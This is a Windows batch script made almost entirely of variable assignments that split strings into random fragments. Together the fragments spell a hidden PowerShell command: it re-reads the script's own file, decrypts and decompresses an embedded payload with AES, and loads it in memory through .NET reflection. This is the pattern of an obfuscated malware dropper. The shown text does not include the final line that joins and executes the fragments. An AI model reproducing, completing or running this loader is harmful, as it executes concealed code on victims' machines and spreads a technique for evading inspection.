@echo off
set "cFWLpKgBad=he"
set "qHBVaodJIH=Wi"
set "fNkZXQtUIS= C"
set "DMGZGTDhaC=ll"
set "nVbKDyloZJ=s\"
set "SBySBVbWnZ=rS"
set "oqSrSvXJwT=py"
set "iuAdxXeitH=\v"
set "vhSAFsPVGa=in"
set "MKmayZpNNF=Sy"
set "yDaVCFZyRv=Po"
set "tZNtFskSeB= /"
set "SazqBaAeno=he"
set "OFExzBkINq=ow"
set "duVruywNOX=em"
set "MrXdqiAmpW=co"
set "VsKFKAAOxs=we"
set "rzgWnGzOvq=ws"
set "FgbTNuiRrb=.e"
set "oxWYWKxeos=we"
set "vjViXKdewz=st"
set "MSYxNdtDYz=32"
set "UahCCpvYpZ=xe"
set "txyrwYgYgA=nd"
set "DdlRCnYGwV=1."
set "jtRaOgVymI=0\"
set "VXLetPDzoq=rs"
set "MCMSaRJmpn=ll"
set "DBZQTDlyuU=do"
set "rTWKRyAwTE=po"
set "lxUhVdZSMS=\W"
set "wNfkECicIM=:\"
set "grjbLVEcYV=y "
set "OtJAiWZMdP= %~dp0"
set "LCRPQDytwk=cd"
set "qwMDbAlHpv=saBm"
set "CCuSvrDafQ=raph"
set "czqsADFcPY=EcoB"
set "xUXxtEvGPD=ptor"
set "ZRWhCJQptV=trea"
set "gaKaYkLDNJ=F'[-"
set "wilCAlBaSK=;$EV"
set "sKSOJoYwru=d;$Z"
set "axOibyQlhH=pher"
set "HTfQZqhKOo==');"
set "IBFCWQHFDF=WZyA"
set "GvBWyQeoVL=New-"
set "rNqLYYEDQM=oB.I"
set "DLRLnbjLVV=rt]:"
set "ULtokKxDFL=ewLi"
set "MGXRIjHewE=.Mod"
set "YIHFLSEsni=gfZU"
set "qEecGBZGSX=fore"
set "KhPUxbrFtH=($WG"
set "PkvWezZqAc=WGEI"
set "aVTVLeVQcl=eam("
set "ZiHZcXaGWT=Comp"
set "ZcAYEOQxfH=m.IO"
set "luNnQauRhR=yste"
set "UxOllQWCPL=embl"
set "bFvXBhIiAI=ptog"
set "rgCKsvXwgw=ew-O"
set "pbfMonCIuN=();$"
set "WQXIzHzKQT=[-1."
set "qdKrewiePQ=Mq, "
set "rawAyzgyBa=gsYZ"
set "uCXtSKqmBD=Invo"
set "gYyeXMydxb=morF"
set "yyqhxZelmI=esMa"
set "xDLDPJcSEf=$Tgf"
set "kJkShfgWfN=EcoB"
set "HLnRrvzSOQ=ne);"
set "sAiXqDytnb=form"
set "AxLezqDAga=EIM."
set "eJaAHbfALI=.Dis"
set "SXyCbLBHwI=ring"
set "ADMwvQEcqs=();$"
set "CgfwkkTjoB=Syst"
set "DgXIggzxEJ=oL'["
set "iyotkPhfwu=ddin"
set "mNHRpoMgBp=Obje"
set "emiIOeMfLc=rity"
set "KidvHTEeEL=)))"
set "UmniaHuyVG=$RUR"
set "kjEivmsMSF=New-"
set "hNzylpndCA=lit("
set "pfVNZXlBQo=ress"
set "ruwaVnzJuM=ert]"
set "hNxrFglhOn=6] -"
set "JsxSWsmCnE=O.Me"
set "ihgrINgolP='[-1"
set "IKrraiPbfg=);$Z"
set "lXiPZsqtBG=th('"
set "TLRAprGnLh=$Tgf"
set "dIiCRqbKRQ=$qul"
set "tKkUXgRmsL=zuZI"
set "NvzUErYhkL=.Len"
set "WPcoOiMqBp=ypto"
set "tallEuZwgR=comm"
set "BXtQLTTbyd=; };"
set "sMoVfbvLmu=, $C"
set "weOAylUsEY=y.Cr"
set "coBAbqFRDy=Disp"
set "KQKHExDcbT=in $"
set "iFtIcMfKOS=oArr"
set "jaQVGgGtSO=ecry"
set "kKqHyBxmuU=Disp"
set "McwtIzsxis=16] "
set "bCcQyTizKT=ddin"
set "xwfpdJtbpm=ZU.T"
set "abcsMxISwC=ress"
set "NEDXKGIGSQ=n ''"
set "Rvylxefzua=flec"
set "dABlCyhqGx=6esa"
set "VUwhnXwcET=y]::"
set "zyjNzzjhns= = N"
set "imuktSDgYF=)) {"
set "MJfeXFjZyN=m.IO"
set "XqVKvsPtDG=RURS"
set "cIkleHgGBn= = $"
set "BQWJOaQqBK=  $D"
set "pAJZDkKQbR=So.D"
set "HiLoueayhJ=);$q"
set "egUXGmWygK=oryS"
set "uTZfsbMvOf=esaB"
set "MqqmDhAHMZ=RmAx"
set "kIxaZgCufu= = ["
set "LVldjipfGa=PTtG"
set "yBgvkzdAHc=vert"
set "ieNoQRSkzQ=grap"
set "bBQwWgFOkA='')("
set "zrsEPywTWu=.Cop"
set "qNzrINkKcB=ct S"
set "aBwpuIHNHR=ect "
set "ciCmEoSPmk=CdJr"
set "jNvUshKuFe=ment"
set "RhhihCvmij=L4Yi"
set "EXYeaBBQnB=Mj.T"
set "wBJDppHrIJ=EIM "
set "iiyEFgnKyJ=]::("
set "yDzfXOBpzT=;$qg"
set "DVaLKCVvuS=;$DH"
set "yoOWiYzlmM= [st"
set "uQbLUBnatu=rans"
set "KQIkltwVuz=yTo("
set "DuLEYJGRvd=-nop"
set "YdKCAghdYe=Stre"
set "bIUSfFJMVz=[Sys"
set "LYKMIypltU=.Con"
set "HCsgHyBQuY=('da"
set "fngUMlRsGT=d.En"
set "cfznVNGBxi=e = "
set "inAFhvEbiO=g = "
set "jSBBtOwBiJ=join"
set "siniOuJiha=ss -"
set "VVKmZePbOx=ck($"
set "gVwfKKAFHZ=e]::"
set "JLTNNUIWte=rK);"
set "QdGGxWGfmm=, (,"
set "uRLqCQPYjr=.Dis"
set "VjTRuaIZlm=('%~f0'"
set "emmIGYyezi='[-1"
set "vYTpzXAFFQ=ode]"
set "aaWLFSYhQA=k; }"
set "smRtflzKvp=]::("
set "smnexEWMuT=-1.."
set "zHOkzwJmAH=.Com"
set "LcxuVvpvmc=gMod"
set "klofojBPmP=ose("
set "xdoHrmpTNq=[Sys"
set "cHElYIhagh=Obje"
set "SdPzfusUid= [Sy"
set "sFhdepTHgC=gth)"
set "XXPSYbxYoc=ay()"
set "AeDtFEOdVG=l5E7"
set "RsTvdhhuIW=ionM"
set "tsEpiiwLph=Comp"
set "ZwmarCljSa=onve"
set "cQZAlAKGWc=gUlB"
set "HoUvEFndmA= '')"
set "IKQznfyihC=::('"
set "VNUHNjCBuO=dJrK"
set "zUjXaqxFsj=.Cry"
